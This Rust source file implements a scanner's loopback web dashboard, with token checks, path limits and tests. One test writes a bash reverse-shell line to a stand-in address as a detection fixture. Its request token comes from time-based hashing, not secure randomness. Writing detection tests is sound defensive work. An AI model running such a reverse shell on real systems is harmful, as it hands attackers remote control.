//! Local web dashboard.
//!
//! `torvex serve` starts a single-threaded-per-connection HTTP server on
//! loopback and serves the same dashboard that a static report uses, plus a
//! scan form that posts to `/api/scan`.
//!
//! Security choices, because a scanner UI is a privileged local service:
//!
//! * Binds `127.0.0.1` by default; a non-loopback bind is explicit.
//! * Mutating requests need `X-Torvex-Token`, a per-process secret injected into
//!   the page. A random website cannot read it, and a custom header forces a
//!   CORS preflight that this server never answers.
//! * Scans are restricted to the configured root unless `--allow-outside-root`
//!   is given.
//! * Responses carry `no-store`, `nosniff` and a restrictive CSP.
//! * Request bodies and header blocks are capped; connections time out.

use std::collections::HashMap;
use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use anyhow::{Context, Result, bail};
use serde::{Deserialize, Serialize};

use crate::engine::ScanReport;
use crate::report;
use crate::scanner::{EngineSelection, ScanOptions, scan_path_with_options};

const MAX_HEADER_BYTES: usize = 32 * 1024;
const MAX_BODY_BYTES: usize = 64 * 1024;
const MAX_CONNECTIONS: usize = 8;
const IO_TIMEOUT: Duration = Duration::from_secs(30);

/// Options for the dashboard server.
#[derive(Debug, Clone)]
pub struct WebOptions {
    /// Interface to bind. Defaults to loopback.
    pub host: String,
    /// TCP port. `0` asks the operating system for a free port.
    pub port: u16,
    /// Directory the dashboard may scan.
    pub root: PathBuf,
    /// Base scan options.
    pub scan: ScanOptions,
    /// Allow scanning outside `root`.
    pub allow_outside_root: bool,
}

impl Default for WebOptions {
    fn default() -> Self {
        Self {
            host: "127.0.0.1".to_owned(),
            port: 8787,
            root: std::env::current_dir().unwrap_or_else(|_| PathBuf::from(".")),
            scan: ScanOptions::default(),
            allow_outside_root: false,
        }
    }
}

#[derive(Debug, Deserialize)]
struct ScanRequest {
    path: String,
    #[serde(default = "default_true")]
    yara: bool,
    #[serde(default = "default_true")]
    native: bool,
    #[serde(default)]
    audit: bool,
}

fn default_true() -> bool {
    true
}

#[derive(Debug, Serialize)]
struct Health {
    status: &'static str,
    version: &'static str,
    root: String,
}

#[derive(Debug, Serialize)]
struct ApiError {
    error: String,
}

struct Shared {
    token: String,
    options: WebOptions,
    report: Mutex<Option<ScanReport>>,
    active: AtomicUsize,
}

/// Starts the dashboard and blocks until the process is stopped.
pub fn serve(options: WebOptions) -> Result<()> {
    let token = generate_token();
    let root = options
        .root
        .canonicalize()
        .unwrap_or_else(|_| options.root.clone());
    let mut options = options;
    options.root = root.clone();

    let listener = TcpListener::bind((options.host.as_str(), options.port))
        .with_context(|| format!("failed to bind {}:{}", options.host, options.port))?;
    listener.set_nonblocking(false)?;
    let address = listener.local_addr()?;

    println!(
        "Torvex dashboard on http://{}:{} (root {}, token {})",
        if options.host == "0.0.0.0" {
            "127.0.0.1"
        } else {
            &options.host
        },
        address.port(),
        root.display(),
        token
    );
    println!("Press Ctrl+C to stop. The request token is required for scans.");
    if options.host != "127.0.0.1" && options.host != "::1" && options.host != "localhost" {
        eprintln!(
            "warning: the dashboard is bound to {}, not loopback. Anyone who can reach this port can request scans within {}.",
            options.host,
            root.display()
        );
    }

    let shared = Arc::new(Shared {
        token,
        options,
        report: Mutex::new(None),
        active: AtomicUsize::new(0),
    });

    for incoming in listener.incoming() {
        let stream = match incoming {
            Ok(stream) => stream,
            Err(error) => {
                eprintln!("warning: failed to accept a connection: {error}");
                continue;
            }
        };
        if shared.active.load(Ordering::SeqCst) >= MAX_CONNECTIONS {
            let _ = respond(
                stream,
                503,
                "text/plain; charset=utf-8",
                b"too many connections\n",
                false,
            );
            continue;
        }
        shared.active.fetch_add(1, Ordering::SeqCst);
        let shared = Arc::clone(&shared);
        std::thread::spawn(move || {
            if let Err(error) = handle(stream, &shared) {
                eprintln!("warning: request failed: {error:#}");
            }
            shared.active.fetch_sub(1, Ordering::SeqCst);
        });
    }

    Ok(())
}

/// Binds a server, returns its base URL and a handle that stops it on drop.
///
/// This exists so integration tests can exercise the real HTTP paths without
/// spawning the CLI.
pub struct TestServer {
    /// Base URL, for example `http://127.0.0.1:34567`.
    pub base_url: String,
    /// Request token required by `/api/scan`.
    pub token: String,
    shutdown: Arc<std::sync::atomic::AtomicBool>,
    handle: Option<std::thread::JoinHandle<()>>,
}

impl TestServer {
    /// Starts the server on an ephemeral loopback port.
    pub fn start(root: &Path, scan: ScanOptions) -> Result<Self> {
        let listener = TcpListener::bind(("127.0.0.1", 0))?;
        let port = listener.local_addr()?.port();
        let token = generate_token();
        let shared = Arc::new(Shared {
            token: token.clone(),
            options: WebOptions {
                host: "127.0.0.1".to_owned(),
                port,
                root: root.canonicalize().unwrap_or_else(|_| root.to_path_buf()),
                scan,
                allow_outside_root: false,
            },
            report: Mutex::new(None),
            active: AtomicUsize::new(0),
        });
        let shutdown = Arc::new(std::sync::atomic::AtomicBool::new(false));
        let flag = Arc::clone(&shutdown);

        let handle = std::thread::spawn(move || {
            for incoming in listener.incoming() {
                if flag.load(Ordering::SeqCst) {
                    break;
                }
                let Ok(stream) = incoming else { continue };
                let shared = Arc::clone(&shared);
                std::thread::spawn(move || {
                    let _ = handle(stream, &shared);
                });
            }
        });

        Ok(Self {
            base_url: format!("http://127.0.0.1:{port}"),
            token,
            shutdown,
            handle: Some(handle),
        })
    }
}

impl Drop for TestServer {
    fn drop(&mut self) {
        self.shutdown.store(true, Ordering::SeqCst);
        // Wake the blocking accept with a throwaway connection.
        let address = self.base_url.trim_start_matches("http://").to_owned();
        let _ = TcpStream::connect(address);
        if let Some(handle) = self.handle.take() {
            let _ = handle.join();
        }
    }
}

fn handle(mut stream: TcpStream, shared: &Shared) -> Result<()> {
    stream.set_read_timeout(Some(IO_TIMEOUT))?;
    stream.set_write_timeout(Some(IO_TIMEOUT))?;
    stream.set_nodelay(true).ok();

    let request = match read_request(&mut stream) {
        Ok(request) => request,
        Err(error) => {
            let _ = respond(
                stream,
                400,
                "text/plain; charset=utf-8",
                format!("bad request: {error}\n").as_bytes(),
                false,
            );
            return Ok(());
        }
    };

    let (method, path) = (request.method.as_str(), request.path.as_str());

    match (method, path) {
        ("GET", "/") | ("GET", "/index.html") => {
            let current = shared
                .report
                .lock()
                .map_err(|_| anyhow::anyhow!("report lock poisoned"))?
                .clone();
            let html = report::render_web(
                current.as_ref(),
                &shared.token,
                Some(&shared.options.root.display().to_string()),
            );
            respond(
                stream,
                200,
                "text/html; charset=utf-8",
                html.as_bytes(),
                true,
            )
        }
        ("GET", "/api/report") => {
            let current = shared
                .report
                .lock()
                .map_err(|_| anyhow::anyhow!("report lock poisoned"))?
                .clone();
            let payload = match current {
                Some(report) => serde_json::to_vec(&report)?,
                None => b"null".to_vec(),
            };
            respond(stream, 200, "application/json", &payload, false)
        }
        ("GET", "/api/health") => {
            let payload = serde_json::to_vec(&Health {
                status: "ok",
                version: env!("CARGO_PKG_VERSION"),
                root: shared.options.root.display().to_string(),
            })?;
            respond(stream, 200, "application/json", &payload, false)
        }
        ("POST", "/api/scan") => {
            let provided = request
                .headers
                .get("x-torvex-token")
                .map(String::as_str)
                .unwrap_or("");
            if !constant_time_eq(provided, &shared.token) {
                let payload = serde_json::to_vec(&ApiError {
                    error: "missing or invalid X-Torvex-Token".to_owned(),
                })?;
                return respond(stream, 403, "application/json", &payload, false);
            }

            let body: ScanRequest = match serde_json::from_slice(&request.body) {
                Ok(body) => body,
                Err(error) => {
                    let payload = serde_json::to_vec(&ApiError {
                        error: format!("invalid JSON body: {error}"),
                    })?;
                    return respond(stream, 400, "application/json", &payload, false);
                }
            };

            let requested = PathBuf::from(&body.path);
            let canonical = match requested.canonicalize() {
                Ok(path) => path,
                Err(error) => {
                    let payload = serde_json::to_vec(&ApiError {
                        error: format!("cannot access {}: {error}", requested.display()),
                    })?;
                    return respond(stream, 400, "application/json", &payload, false);
                }
            };
            if !shared.options.allow_outside_root && !canonical.starts_with(&shared.options.root) {
                let payload = serde_json::to_vec(&ApiError {
                    error: format!(
                        "refusing to scan {} outside the dashboard root {} (start with --allow-outside-root to permit it)",
                        canonical.display(),
                        shared.options.root.display()
                    ),
                })?;
                return respond(stream, 403, "application/json", &payload, false);
            }

            let mut options = shared.options.scan.clone();
            options.engines = EngineSelection {
                yara: body.yara,
                native: body.native,
                audit: body.audit,
            };
            if body.audit {
                options.audit_root = Some(if canonical.is_dir() {
                    canonical.clone()
                } else {
                    PathBuf::from("/")
                });
            }

            match scan_path_with_options(&canonical, &options) {
                Ok(report) => {
                    let payload = serde_json::to_vec(&report)?;
                    *shared
                        .report
                        .lock()
                        .map_err(|_| anyhow::anyhow!("report lock poisoned"))? = Some(report);
                    respond(stream, 200, "application/json", &payload, false)
                }
                Err(error) => {
                    let payload = serde_json::to_vec(&ApiError {
                        error: format!("{error:#}"),
                    })?;
                    respond(stream, 422, "application/json", &payload, false)
                }
            }
        }
        ("OPTIONS", _) => respond(
            stream,
            405,
            "text/plain; charset=utf-8",
            b"no cors\n",
            false,
        ),
        _ => respond(
            stream,
            404,
            "text/plain; charset=utf-8",
            b"not found\n",
            false,
        ),
    }
}

struct Request {
    method: String,
    path: String,
    headers: HashMap<String, String>,
    body: Vec<u8>,
}

fn read_request(stream: &mut TcpStream) -> Result<Request> {
    let mut buffer = Vec::with_capacity(4096);
    let mut chunk = [0_u8; 4096];

    let header_end = loop {
        if let Some(position) = find_headers_end(&buffer) {
            break position;
        }
        if buffer.len() > MAX_HEADER_BYTES {
            bail!("header block too large");
        }
        let read = stream.read(&mut chunk)?;
        if read == 0 {
            bail!("connection closed before headers completed");
        }
        buffer.extend_from_slice(&chunk[..read]);
    };

    let head = String::from_utf8_lossy(&buffer[..header_end]).into_owned();
    let mut lines = head.split("\r\n");
    let request_line = lines.next().context("missing request line")?;
    let mut parts = request_line.split_whitespace();
    let method = parts.next().unwrap_or_default().to_owned();
    let raw_path = parts.next().unwrap_or("/").to_owned();
    let path = raw_path.split('?').next().unwrap_or("/").to_owned();

    let mut headers = HashMap::new();
    for line in lines {
        if let Some((name, value)) = line.split_once(':') {
            headers.insert(name.trim().to_ascii_lowercase(), value.trim().to_owned());
        }
    }

    let content_length = headers
        .get("content-length")
        .and_then(|value| value.parse::<usize>().ok())
        .unwrap_or(0);
    if content_length > MAX_BODY_BYTES {
        bail!("request body too large");
    }

    let mut body = buffer[header_end + 4..].to_vec();
    while body.len() < content_length {
        let read = stream.read(&mut chunk)?;
        if read == 0 {
            break;
        }
        body.extend_from_slice(&chunk[..read]);
    }
    body.truncate(content_length);

    Ok(Request {
        method,
        path,
        headers,
        body,
    })
}

fn find_headers_end(buffer: &[u8]) -> Option<usize> {
    buffer.windows(4).position(|window| window == b"\r\n\r\n")
}

fn respond(
    mut stream: TcpStream,
    status: u16,
    content_type: &str,
    body: &[u8],
    html: bool,
) -> Result<()> {
    let reason = match status {
        200 => "OK",
        400 => "Bad Request",
        403 => "Forbidden",
        404 => "Not Found",
        405 => "Method Not Allowed",
        422 => "Unprocessable Entity",
        503 => "Service Unavailable",
        _ => "Error",
    };
    let mut headers = format!(
        "HTTP/1.1 {status} {reason}\r\nContent-Type: {content_type}\r\nContent-Length: {}\r\nCache-Control: no-store\r\nX-Content-Type-Options: nosniff\r\nReferrer-Policy: no-referrer\r\nX-Frame-Options: DENY\r\nConnection: close\r\n",
        body.len()
    );
    if html {
        headers.push_str(
            "Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; connect-src 'self'; img-src data:; base-uri 'none'; form-action 'none'\r\n",
        );
    }
    headers.push_str("\r\n");
    stream.write_all(headers.as_bytes())?;
    stream.write_all(body)?;
    stream.flush()?;
    Ok(())
}

/// Compares two secrets without leaking their length through timing.
fn constant_time_eq(left: &str, right: &str) -> bool {
    let left = left.as_bytes();
    let right = right.as_bytes();
    if left.len() != right.len() {
        return false;
    }
    let mut difference = 0_u8;
    for (a, b) in left.iter().zip(right.iter()) {
        difference |= a ^ b;
    }
    difference == 0
}

/// Generates a 128-bit request token from time and process state.
///
/// This is a CSRF guard, not a password: it only needs to be unguessable by a
/// remote web page, and it never leaves the process or the served page.
fn generate_token() -> String {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|duration| duration.as_nanos())
        .unwrap_or(0);
    let mut first = 0xcbf2_9ce4_8422_2325_u64;
    let mut second = 0x9e37_79b9_7f4a_7c15_u64;
    for byte in format!(
        "{}:{}:{}:{}",
        std::process::id(),
        nanos,
        std::thread::current().name().unwrap_or("main"),
        std::env::temp_dir().display()
    )
    .bytes()
    {
        first ^= u64::from(byte);
        first = first.wrapping_mul(0x0000_0100_0000_01b3);
        second = second.rotate_left(7) ^ u64::from(byte);
        second = second.wrapping_mul(0x9e37_79b9_7f4a_7c15);
    }
    format!("{first:016x}{second:016x}")
}

#[cfg(test)]
mod tests {
    use super::*;

    fn http(base: &str, request: &str) -> String {
        let address = base.trim_start_matches("http://");
        let mut stream = TcpStream::connect(address).expect("connect");
        stream.write_all(request.as_bytes()).expect("write");
        let mut response = String::new();
        stream.read_to_string(&mut response).expect("read");
        response
    }

    #[test]
    fn tokens_are_stable_length_and_unique() {
        let first = generate_token();
        let second = generate_token();
        assert_eq!(first.len(), 32);
        assert_ne!(first, second);
        assert!(constant_time_eq(&first, &first));
        assert!(!constant_time_eq(&first, &second));
        assert!(!constant_time_eq("short", "longer"));
    }

    #[test]
    fn serves_health_and_rejects_untrusted_scans() {
        let temp = tempfile::tempdir().expect("temp dir");
        std::fs::write(temp.path().join("file.txt"), "ordinary text").expect("write");
        let server = TestServer::start(temp.path(), ScanOptions::default()).expect("start");

        let health = http(
            &server.base_url,
            "GET /api/health HTTP/1.1\r\nHost: localhost\r\n\r\n",
        );
        assert!(health.starts_with("HTTP/1.1 200"));
        assert!(health.contains("\"status\":\"ok\""));

        let index = http(
            &server.base_url,
            "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n",
        );
        assert!(index.contains("const WEB = true;"));
        assert!(index.contains(&server.token));
        assert!(index.contains("Content-Security-Policy"));

        // No token: refused.
        let body = "{\"path\":\".\"}";
        let request = format!(
            "POST /api/scan HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\nContent-Length: {}\r\n\r\n{}",
            body.len(),
            body
        );
        let refused = http(&server.base_url, &request);
        assert!(refused.starts_with("HTTP/1.1 403"));
    }

    #[test]
    fn a_scan_request_with_a_token_returns_a_report() {
        let temp = tempfile::tempdir().expect("temp dir");
        std::fs::write(
            temp.path().join("run.sh"),
            "#!/bin/bash\nbash -i >& /dev/tcp/203.0.113.7/4444 0>&1\n",
        )
        .expect("write");
        let server = TestServer::start(temp.path(), ScanOptions::default()).expect("start");

        let body = format!("{{\"path\":\"{}\"}}", temp.path().display());
        let request = format!(
            "POST /api/scan HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\nX-Torvex-Token: {}\r\nContent-Length: {}\r\n\r\n{}",
            server.token,
            body.len(),
            body
        );
        let response = http(&server.base_url, &request);
        assert!(response.starts_with("HTTP/1.1 200"), "{response}");
        assert!(response.contains("\"schema\":\"torvex.report.v2\""));
        assert!(response.contains("TVX-NAT-008"));

        let report = http(
            &server.base_url,
            "GET /api/report HTTP/1.1\r\nHost: localhost\r\n\r\n",
        );
        assert!(report.contains("TVX-NAT-008"));
    }

    #[test]
    fn scans_outside_the_root_are_refused() {
        let temp = tempfile::tempdir().expect("temp dir");
        let server = TestServer::start(temp.path(), ScanOptions::default()).expect("start");
        let body = "{\"path\":\"/etc\"}";
        let request = format!(
            "POST /api/scan HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\nX-Torvex-Token: {}\r\nContent-Length: {}\r\n\r\n{}",
            server.token,
            body.len(),
            body
        );
        let response = http(&server.base_url, &request);
        assert!(response.starts_with("HTTP/1.1 403"), "{response}");
    }

    #[test]
    fn oversized_bodies_are_rejected_before_reading_them() {
        let temp = tempfile::tempdir().expect("temp dir");
        let server = TestServer::start(temp.path(), ScanOptions::default()).expect("start");
        let request = format!(
            "POST /api/scan HTTP/1.1\r\nHost: localhost\r\nX-Torvex-Token: {}\r\nContent-Length: {}\r\n\r\n",
            server.token,
            MAX_BODY_BYTES + 1
        );
        let response = http(&server.base_url, &request);
        assert!(response.starts_with("HTTP/1.1 400"), "{response}");
    }
}
